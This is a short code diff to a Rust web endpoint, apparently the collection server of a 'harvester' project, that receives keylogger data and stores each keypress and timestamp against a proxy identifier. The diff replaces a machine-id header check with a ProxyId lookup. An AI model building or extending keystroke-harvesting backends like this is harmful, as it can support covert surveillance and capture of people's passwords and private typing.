@@ -1,7 +1,8 @@
 use axum::{Json, extract::State, http::HeaderMap};
 use oxalate_schemas::harvester::public::keylogger::post_keylogger::*;
+use oxalate_scrapper_controller::ProxyId;
 
-use crate::{AppState, Error, insure_device_exists};
+use crate::{AppState, Error};
 
 #[utoipa::path(
     post,
@@ -21,11 +22,7 @@ pub async fn post_keylogger(
     State(app_state): State<AppState>,
     Json(req): Json<Req>,
 ) -> Result<(), Error> {
-    let machine_id = headers
-        .get("machine-id")
-        .and_then(|v| v.to_str().ok())
-        .ok_or(Error::BadRequest("No machine-id in header".into()))?;
-    insure_device_exists(machine_id, &app_state.db_pool).await?;
+    let proxy_id = ProxyId::from_http_headers(&headers, &app_state.db_pool).await?;
 
     for key in req.0.iter() {
         let db_pool = app_state.db_pool.clone();
@@ -36,7 +33,7 @@ pub async fn post_keylogger(
                         VALUES ($1, $2, $3)
                     ;
                 "#,
-            machine_id,
+            proxy_id.as_ref(),
             &key.key_pressed,
             &key.at,
         )
